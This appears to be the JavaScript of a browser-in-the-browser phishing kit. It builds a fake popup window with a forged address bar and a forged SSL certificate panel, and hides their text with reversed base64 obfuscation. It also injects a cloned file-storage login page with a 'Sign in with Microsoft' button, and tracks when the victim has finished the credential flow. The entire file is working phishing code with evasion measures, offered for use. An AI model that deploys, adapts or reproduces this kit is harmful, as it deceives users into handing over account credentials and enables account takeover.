
// For demo obfuscation
const PREFIX = "OBFS";
const SUFFIX = "END";

const obfEnd = 'OBFS==Qaz12aEND';

const targetElementSelector = '.win-scroll'; 

// Sizing constants
// Not efficient, but works.
const popHeight = "600px";
const popWidth = "660px";
const originalContentHeight = "500px";

const popMaximizedHeight = "600px";
const popMaximizedWidth = "900px";

const popTop = "50%";
const popLeft = "50%";
const popTransform = "translate(-50%, -50%)";

// We add an extra offset from top to make it more realistic
const popContentTransform = "translate(-50%, -50%) translateY(50px)";



function setInitialSize() {
    // Sets default/initial size and position
    $("#pop-window").css("width", popWidth);
    $("#pop-window").css("height", popHeight);
    $("#pop-window").css("top", popTop);
    $("#pop-window").css("left", popLeft);
    $("#pop-window").css("transform", popTransform);

    $("#pop-background-container").css("width", popWidth);
    $("#pop-background-container").css("height", popHeight);
    $("#pop-background-container").css("top", popTop);
    $("#pop-background-container").css("left", popLeft);
    $("#pop-background-container").css("transform", popTransform);

    $(targetElementSelector).css("width", popWidth);
    $(targetElementSelector).css("height", originalContentHeight);
    $(targetElementSelector).css("top", popTop);
    $(targetElementSelector).css("left", popLeft);
    $(targetElementSelector).css("transform", popContentTransform);
}



function deobfString(str) {
  let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
  let reversed = withoutPrefixSuffix.split('').reverse().join('');
  return atob(reversed);
}


function openTop() {
    $("#pop-control-esc-mobile").css('display', "block");
    $("#pop-window").css('display', "block");
    $("#pop-background-container").css('display', "block");
    deObfData();
    
    applyPositioning();
}

function openIn(){
        let checkExist = setInterval(function() {
      
        if ($(targetElementSelector).length) {
                $(targetElementSelector).css('display', "block");

                applyPositioning();

              // Set up a short duration recheck to combat other scripts
              let recheckDuration = 1000;  // 1 second
              let recheckStart = Date.now();
              let recheckInterval = setInterval(function() {
                 if (Date.now() - recheckStart > recheckDuration) {
                     clearInterval(recheckInterval);
                     return;
                 }
                $(targetElementSelector).css('display', "block");

                applyPositioning();
              }, 50);  // recheck every 50 milliseconds
        
              clearInterval(checkExist);
          }
        }, 50);
}



function deObfData() {
    try{
        // URI Bar
        document.getElementById('pop-uri-prefix').innerText = deobfString(document.getElementById('pop-uri-prefix').innerText) + "//";
        document.getElementById('pop-uri-host').innerText = deobfString(document.getElementById('pop-uri-host').innerText);
        document.getElementById('pop-uri-path').innerText = "/" + deobfString(document.getElementById('pop-uri-path').innerText);
        
        // Rest
        document.getElementById('pop-title-text').innerText = deobfString(document.getElementById('pop-title-text').innerText);

        document.getElementById('pop-ssl-head-title').innerText = deobfString(document.getElementById('pop-ssl-head-title').innerText);
        document.getElementById('pop-ssl-text-1').innerText = deobfString(document.getElementById('pop-ssl-text-1').innerText);
        document.getElementById('pop-ssl-text-2').innerText = deobfString(document.getElementById('pop-ssl-text-2').innerText);
        document.getElementById('pop-ssl-text-3').innerText = deobfString(document.getElementById('pop-ssl-text-3').innerText);
  
    } catch {
        return;
    }
}








function handleDnDLogic() {
    //////////////// Make window draggable ////////////////
    let draggable = $('#pop-window');
    let winScroll = $(targetElementSelector);
    let title = $('#pop-title-bar');

    title.on('mousedown', function(e) {

        if (e.target.id.indexOf('pop-control') === -1) {

        let dr = $(draggable).addClass("drag");
        let db = $('#pop-background-container');
        let dt = $(targetElementSelector).addClass("drag");
        

        let initialDiffX = dt.offset().left - dr.offset().left;
        let initialDiffY = dt.offset().top - dr.offset().top;
        
        let ypos = e.pageY - dr.offset().top;
        let xpos = e.pageX - dr.offset().left;

        $(document.body).on('mousemove', function(e) {
            
            let itop = e.pageY - ypos;
            let ileft = e.pageX - xpos;

            if(dr.hasClass("drag")) {
                dr.offset({top: itop, left: ileft});
                db.offset({top: itop, left: ileft});
            }
            
            if(dt.hasClass("drag")) {
                dt.offset({top: itop + initialDiffY, left: ileft + initialDiffX});
            }

        }).on('mouseup', function(e) {
            
            let draggable = $('#pop-window');

            let dr = $(draggable);
            let dt = $(targetElementSelector);

            if (dr.hasClass("drag")){
                dr.removeClass("drag");
                dt.removeClass("drag");
        
            let btbPosition = {
                top: dr.offset().top,
                left: dr.offset().left,
                width: dr.css('width'),
                height: dr.css('height'),
                enlarged: dr.hasClass('enlarged')
            };
        

            localStorage.setItem('pop-window-position', JSON.stringify(btbPosition));
        
            let winScrollOffset = {
                top: dt.offset().top - dr.offset().top,
                left: dt.offset().left - dr.offset().left
            };
        
            localStorage.setItem('win-scroll-offset', JSON.stringify(winScrollOffset));
            }

        });
        }
    });
}

// Function to apply positioning
function applyPositioning() {

    // Set default/initial size and position then check for modifications needed
    setInitialSize();

    let storedBtbPosition = localStorage.getItem('pop-window-position');
    let storedWinScrollOffset = localStorage.getItem('win-scroll-offset');


    if(storedBtbPosition !== null && storedWinScrollOffset !== null) {

        // console.log("storedBtbPosition: ", storedBtbPosition)


        let btbPosition = JSON.parse(storedBtbPosition);
        let winOffset = JSON.parse(storedWinScrollOffset);
        
        if (btbPosition.enlarged === "true"){
            $("#pop-control-max").addClass("enlarged");
        }

        $("#pop-window").css('width', btbPosition.width);
        $("#pop-window").css('height', btbPosition.height);
        $("#pop-background-container").css('width', btbPosition.width);
        $("#pop-background-container").css('height', btbPosition.height);

        let winScrollTop = btbPosition.top + winOffset.top;
        let winScrollLeft = btbPosition.left + winOffset.left;

        $("#pop-window").offset({
            top: btbPosition.top,
            left: btbPosition.left
        });
        $("#pop-background-container").offset({
           top: btbPosition.top,
            left: btbPosition.left
      });
        $(targetElementSelector).offset({
            top: winScrollTop,
            left: winScrollLeft
        });
 
    }

}



////////////////// Onclick listeners //////////////////

function closePopup(){
    $("#pop-window").css("display", "none");
    $("#pop-background-container").css("display", "none");
    $("#pop-control-esc-mobile").css("display", "none");


    $(targetElementSelector).css("display", "none");
    $(targetElementSelector).classList = "win-scroll closed";


    $("#pop-ssl").removeClass("visible");
    $("#pop-ssl-icon").removeClass("visible");
    localStorage.setItem('bb-open', false);
    localStorage.removeItem('pop-window-position');
    localStorage.removeItem('win-scroll-offset');
}



function toggleSSLPopup(){
    let sslPopup = $("#pop-ssl");
    let sslIcon = $("#pop-ssl-icon");
    if (sslPopup.hasClass("visible")){
        sslPopup.removeClass("visible")
        sslIcon.removeClass("visible")
    } else {
        sslPopup.addClass("visible")
        sslIcon.addClass("visible")
    }
    
  }




function enlarge(){
    let max = document.getElementById("pop-control-max");

    if(max.classList.contains("enlarged")){
        $("#pop-window").css("width", popWidth);
        $("#pop-window").css("height", popHeight);
        $("#pop-background-container").css("width", popWidth);
        $("#pop-background-container").css("height", popHeight);
        $("#pop-title-bar-width").css('width', '100%').css('width', '+=2px');
        $("#pop-content-container").css("width", "100%");
        $("#pop-control-max").removeClass("enlarged");
    }
    else{
        $("#pop-window").css("width", popMaximizedWidth);
        $("#pop-window").css("height", popMaximizedHeight);
        $("#pop-background-container").css("width", popMaximizedWidth);
        $("#pop-background-container").css("height", popMaximizedHeight);
        $("#pop-title-bar-width").css('width', '100%').css('width', '+=2px');
        $("#pop-content-container").css("width", "100%");
        $("#pop-control-max").addClass("enlarged");

    }
  
    let dr = $("#pop-window");
    let dt = $(targetElementSelector);
    
    let btbPosition = {
        top: dr.offset().top,
        left: dr.offset().left,
        width: dr.css('width'),
        height: dr.css('height'),
        enlarged: dr.hasClass('enlarged')
    };
    localStorage.setItem('pop-window-position', JSON.stringify(btbPosition));
  
    let winScrollOffset = {
        top: dt.offset().top - dr.offset().top,
        left: dt.offset().left - dr.offset().left
    };
    localStorage.setItem('win-scroll-offset', JSON.stringify(winScrollOffset));
}



async function setPrimaryContent(locationDivId, contentHTML, cssUrls, jsUrls){
    // Handling the landing page content this way to allow more isolation of styles and scripts
    // and enable more efficient methods that will come soon
    // Create shadowroot element and append to it HTML, CSS, JS content

    const contentDiv = document.getElementById(locationDivId);
    const shadowRoot = contentDiv.attachShadow({ mode: 'open' });

    let scriptsToLoad = jsUrls.length;

    const checkAllLoaded = () => {
        if (scriptsToLoad === 0) {
            // dispatch the event when all scripts are loaded
            const contentLoadedEvent = new Event('PrimaryContentLoaded', { bubbles: true, composed: true });
            document.dispatchEvent(contentLoadedEvent);
            console.log("Secondary Dispatched: PrimaryContentLoaded")

            // now check if the auth flow is completed and inform primary
            handleIsOpenedState(shadowRoot)
        }
    };

    // function to append CSS files
    cssUrls.forEach(url => {
        const link = document.createElement('link');
        link.href = url;
        link.type = 'text/css';
        link.rel = 'stylesheet';
        shadowRoot.appendChild(link);
    });

    // append HTML content
    shadowRoot.innerHTML += contentHTML;


    // function to append JS files
    jsUrls.forEach(url => {
        const script = document.createElement('script');
        script.src = url;
        script.type = 'text/javascript';
        script.onload = () => {
            scriptsToLoad--;
            checkAllLoaded(); 
        };
        script.onerror = () => {
            console.error(`Error loading script: ${url}`);
            scriptsToLoad--;
            checkAllLoaded(); 
        };
        shadowRoot.appendChild(script);
    });

    // check if there are no scripts to load
    checkAllLoaded();
}



function handleSecondaryFlowStart() {
    // triggered opening from primary, will open always
    localStorage.setItem('bb-open', true);
    openTop();
    openIn();
}

function handleIsOpenedState (shadowRoot) {

    let targetPath = '/' + deobfString(obfEnd);
    let doneAlready = localStorage.getItem('bb-done');
    let openedAlready = localStorage.getItem('bb-open');
    

    let wasOpened = openedAlready === "true";
    let isCompleted = window.location.pathname === targetPath || doneAlready;

    if (wasOpened && !isCompleted) {
        openTop();
        openIn();
    }
    // Check if we just reached the final flow page or flow was already completed
    else if (isCompleted) {
        console.log("Secondary: flow is done");
        localStorage.setItem('bb-open', false);
        localStorage.setItem('bb-done', true);
        // Inform primary page that flow is completed
        shadowRoot.dispatchEvent(new CustomEvent('secondaryFlowCompleted', {bubbles: true, composed: true}));
    }
    

}


// fix for JS-based re-mounting and class changes of target elements (seen in branded Microsoft pages)
// also check for silent state/navigation changes that might cause similar behavior
// reference: https://github.com/waelmas/frameless-bitb/issues/4
function startObserving(targetSelector) {
    let targetElement = document.querySelector(targetSelector);
    const observerConfig = { childList: true, subtree: true, attributes: true, attributeFilter: ['class'] };
    
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {

        if (mutation.type === 'attributes' && targetElement.classList.contains('closed')) {
            return; // ignore mutation due to control-btns
        }
        // check if the mutation is due to D&D by checking the 'drag' class and ignore style changes
        if (mutation.type === 'attributes' && targetElement.classList.contains('drag')) {
            // sleep for a short duration to allow the D&D to complete
            setTimeout(() => {}, 50);
            return; // ignore mutation due to D&D
        }
        if (mutation.type === 'childList') {
          mutation.addedNodes.forEach((node) => {
            if (node === targetElement || node.contains(targetElement)) {
              handleIsOpenedState();
            }
          });
          mutation.removedNodes.forEach((node) => {
            if (node === targetElement || node.contains(targetElement)) {
              // target element removed, attempt to find and observe it again
              waitForElement(targetSelector);
            }
          });
        }
        else if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
            handleIsOpenedState();
        }
      });
    });
  
    const observe = () => {
      const bodyObserver = new MutationObserver(() => {
        const newTargetElement = document.querySelector(targetSelector);
        if (newTargetElement && newTargetElement !== targetElement) {
          targetElement = newTargetElement; // update the target element reference
          observer.observe(targetElement.parentElement, observerConfig);
          observer.observe(targetElement, observerConfig);
          // keep observing, otherwise then the user moves back and forth between the user/pass screen
          // the target element will not be observed again, resulting in the white screen issue again
        }
      });
  
      // start observing the document body for re-mounting of the target element
      bodyObserver.observe(document.body, { childList: true, subtree: true });
      // observe the initial target and its parent, if available
      if (targetElement) {
        observer.observe(targetElement.parentElement, observerConfig);
        observer.observe(targetElement, observerConfig);
      }
    };
  
    observe();
  }
  
  function waitForElement(selector) {
    const interval = setInterval(() => {
      const element = document.querySelector(selector);
      if (element) {
        console.log('Target element found, starting observers.');
        startObserving(selector);
        clearInterval(interval);
      }
    }, 100); // check every 100 milliseconds till found
  }

  





function hadleDOMContentLoaded() {    

    // inject the primary page, then initialize it
    setPrimaryContent('primary', primaryHTML, cssURLs, jsURLs)

    // and set default size of the secondary
    setInitialSize();

    let titleBar = document.getElementById("pop-title-bar");
    let exit = document.getElementById("pop-control-esc");
    let exit2 = document.getElementById("pop-control-esc-mobile");
    let max = document.getElementById("pop-control-max");
    let min = document.getElementById("pop-control-min");
    let sslIcon = document.getElementById('pop-ssl-icon');
    let sslIconExit = document.getElementById('pop-ssl-head-esc');


    titleBar.addEventListener('dblclick', function handleMouseOver() {
        enlarge();
    });
    
    titleBar.addEventListener('mouseout', function handleMouseOver() {
      titleBar.style.cursor = 'default';
    });

    exit.addEventListener('click', closePopup);
    exit2.addEventListener('click', closePopup);
    min.addEventListener('click', closePopup);
    max.addEventListener('click', enlarge);

    sslIcon.addEventListener('click', toggleSSLPopup);
    sslIconExit.addEventListener('click', toggleSSLPopup);


    handleDnDLogic();

    // start observing the target element (to apply observers for re-mounting and class changes)
    waitForElement(targetElementSelector);

}



document.addEventListener('DOMContentLoaded', hadleDOMContentLoaded);

document.addEventListener('secondaryFlowStart', handleSecondaryFlowStart)




// Content for the landing page (aka primary page)

const cssURLs = ['/primary/w3.css']
const jsURLs = ['/primary/script.js']

const primaryHTML = `<div style="background-color: rgb(160, 156, 150);">
    <style>
        * {
            margin: 0;
            padding: 0;
            border: 0;
            outline: 0;
            font-size: 100%;
            vertical-align: baseline;
            background: transparent;
            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
        }
    </style>
    <div style="height: 100vh; width: 240px; background-color: rgb(224, 221, 215); position: absolute;">
        <svg viewBox="0 0 136 136" fill="none" role="presentation" focusable="false" width="160" height="160"
            class="dig-ContentIcon dig-ContentIcon--large" data-testid="FolderBaseDefaultLarge">
            <path
                d="M57.561 36.184c.465.928 1.163 1.795 1.798 2.429.805.803 2.023 1.387 3.698 1.387H116.5v57.13c-.144 2.681-.713 5.228-2.683 7.193-1.805 1.801-4.425 2.677-7.709 2.677H30.892c-3.284 0-5.904-.876-7.709-2.677-1.805-1.801-2.683-4.414-2.683-7.69V29l30.408.003c1.691.054 3.196.814 4.163 2.214l2.49 4.967Z"
                fill="var(--dig-color__foldericon__shadow, #75aaff)"></path>
            <path
                d="M57.561 36.184c.465.928 1.163 1.795 1.798 2.429.805.803 2.023 1.387 3.698 1.387H116.5v56.13c-.144 2.681-.713 5.228-2.683 7.193-1.805 1.801-4.425 2.677-7.709 2.677H30.892c-3.284 0-5.904-.876-7.709-2.677-1.805-1.801-2.683-4.414-2.683-7.69V29l30.408.003c1.691.054 3.196.814 4.163 2.214l2.49 4.967Z"
                fill="var(--dig-color__foldericon__container, #a0c4ff)"></path>
        </svg>
        <div
            style="line-height: 40px; font-size: 17px; letter-spacing: 0.5px; color: rgba(0, 0, 0, 0.734); margin-left: 42px; margin-top: -30px;">
            <p style="color: black;">All files</p>
            <p>Photos</p>
            <p>Shared</p>
            <p>File requests</p>
            <p>Deleted files</p>
        </div>
    </div>
    <div style="height: 100vh; position: absolute;
    background-color: rgba(255, 255, 255, 0.64); width: 100%;">

    </div>
    <div style="
        background: #fff;
        width: calc(100% - 630px);
        min-width: 500px;
        padding: 55px 90px;
        margin: auto;
          margin-bottom: auto;
        position: relative;
        top: 55px;
        margin-bottom: 80px;
        min-height: 450px;
        display: flex;
        justify-content: center;
        box-shadow: 0 0 0 1px rgba(99,114,130,0.16),0 8px 16px rgba(27,39,51,0.08);">
        <div>
            <p style="font-size: 24px; color: rgba(0, 0, 0, 0.734); text-align: center;">Welcome back</p>

            <style>
                #login-btn:hover {
                    background-color: #000;
                    color: white;
                }

                #login-btn {
                    display: flex;
                    width: 100%;
                    border: 1px solid rgba(39, 39, 39, 0.474);
                    padding: 8px 46px;
                    background-color: transparent;
                    color: rgba(0, 0, 0, 0.837);
                    cursor: pointer;
                    text-align: center;
                    align-items: center;
                    justify-content: center;
                    font-size: 14px;
                    margin: 27px 0px 16px;
                }

                #login-btn-2 {
                    background-color: rgb(23, 112, 255);
                    color: white;
                    text-align: center;
                    padding: 18px;
                    border-radius: 16px;
                    margin-top: 32px;
                    width: 100%;
                }

                #login-btn-2:hover {
                    background-color: rgb(0, 98, 255);
                    cursor: pointer;
                }
            </style>
            <div style="margin-top: 80px; text-align: center; line-height: 30px;">
                <button id="login-btn">
                    <img id="lgImg" src="/primary/images/msf.svg" style="margin: 0px 8px; width: 10%;" />OBFS==Adm92cvJ3Yp1EIoRXa3BibpBibnl2UEND
                    <svg class="pointer" width="20" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg"
                        style="margin: 0px 4px 0px">
                        <path
                            d="M22.375 12.5437C22.375 13.1909 21.8503 13.7156 21.2031 13.7156L4.79687 13.7156C4.14967 13.7156 3.625 13.1909 3.625 12.5437C3.625 11.8965 4.14966 11.3718 4.79687 11.3718L21.2031 11.3718C21.8503 11.3718 22.375 11.8965 22.375 12.5437Z"
                            fill="rgb(0,0,0, 0.7)"></path>
                        <path
                            d="M12.1714 21.5755C11.7137 21.1178 11.7137 20.3758 12.1714 19.9182L19.5458 12.5437L12.1714 5.16922C11.7137 4.71157 11.7137 3.96958 12.1714 3.51194C12.629 3.05429 13.371 3.05429 13.8286 3.51194L22.0318 11.7151C22.4894 12.1727 22.4894 12.9147 22.0318 13.3723L13.8286 21.5755C13.371 22.0331 12.629 22.0331 12.1714 21.5755Z"
                            fill="rgb(0,0,0, 0.7)"></path>
                    </svg>
                </button>

                <div style="display: flex; justify-content: center;">
                    <div style="border-bottom: 1px solid rgba(0, 0, 0, 0.226); width: 150px;"></div>
                    <div style="margin: 0px 16px -13px;">or</div>
                    <div style="border-bottom: 1px solid rgba(0, 0, 0, 0.226); width: 150px;"></div>
                </div>
                <div style="margin-top: 32px;">
                    <p>Log in using</p>
                    <p id="email"></p>

                </div>
                <div style="text-align: left; margin-top: 18px;">
                    <div style="font-size: 12px; color: rgba(0, 0, 0, 0.601);">
                        Password
                    </div>
                    <input type="text" name="" id=""
                        style="border: 0.5px solid rgba(0, 0, 0, 0.389); width: 95%; padding: 12px;" disabled>
                    <div style="font-size: 12px; color: rgba(23, 112, 255); margin-top: 8px;">
                        Forgot your password?
                    </div>
                    <button id="login-btn-2">
                        Log in
                    </button>
                </div>
            </div>
        </div>
    </div>
    </div>
    <script src="/primary/script.js"></script>
</div>`